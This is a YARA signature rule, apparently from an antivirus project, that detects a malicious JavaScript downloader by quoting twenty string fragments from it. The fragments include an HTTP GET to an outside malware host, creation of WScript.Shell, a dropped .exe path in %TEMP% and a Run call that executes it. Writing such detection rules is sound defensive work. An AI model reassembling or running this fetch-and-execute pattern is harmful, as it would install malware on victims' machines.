rule sig_20160401_d3de2fbfe2b092633cfd7f4afe7aa4d0 {
  meta:
    description = "datamaliciousorder - file 20160401_d3de2fbfe2b092633cfd7f4afe7aa4d0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7dc707f9b9ac639825cb0e1c7be1685e2b83832c6d9e935277f5d71775ed578b"

  strings:
    $s1  = "NnTv[NtjUef](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "var UwmNam = function ThEu() {return WScript[KrwKh](\"WScript\"+\".Shell\");}(), ZtOp = 11;" fullword ascii
    $s3  = "function QlZh(MoRzh, LuvWi){LkOg = LkOg * 1; return MoRzh - LuvWi;};" fullword ascii
    $s4  = "if (NnTv[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GvEm() {return UwmNam[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Y56uousYjPNTC4.ex\" + \"e\";};" fullword ascii
    $s6  = "function AzQw(){return VojMkv + \"\";};" fullword ascii
    $s7  = "function ValAm() {return ((VnnZv == true) && (VnnZv == OldNd)) ? 1 : LkOg;};" fullword ascii
    $s8  = "function KmRa(DqiEf){UwmNam[\"R\"+\"un\"](DqiEf, LkOg, LkOg);};" fullword ascii
    $s9  = "VnnZv = true; " fullword ascii
    $s10 = "var NuWcr = false;" fullword ascii
    $s11 = "}while (GepBmz);" fullword ascii
    $s12 = "return QlZh(HiOnq, QbOi);" fullword ascii
    $s13 = "var VnnZv = false;" fullword ascii
    $s14 = "OldNd = true; " fullword ascii
    $s15 = "function FqOfj(){return 23;};" fullword ascii
    $s16 = "function FgSss()" fullword ascii
    $s17 = "function ElmTmd(ApvTl) {var LqoTqn = (1, 2, 3, 4, 5, ApvTl); return LqoTqn;};" fullword ascii
    $s18 = "var AscEy = new this[\"Date\"]();" fullword ascii
    $s19 = "function GglDz(){return KrwKh;};" fullword ascii
    $s20 = "var OldNd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}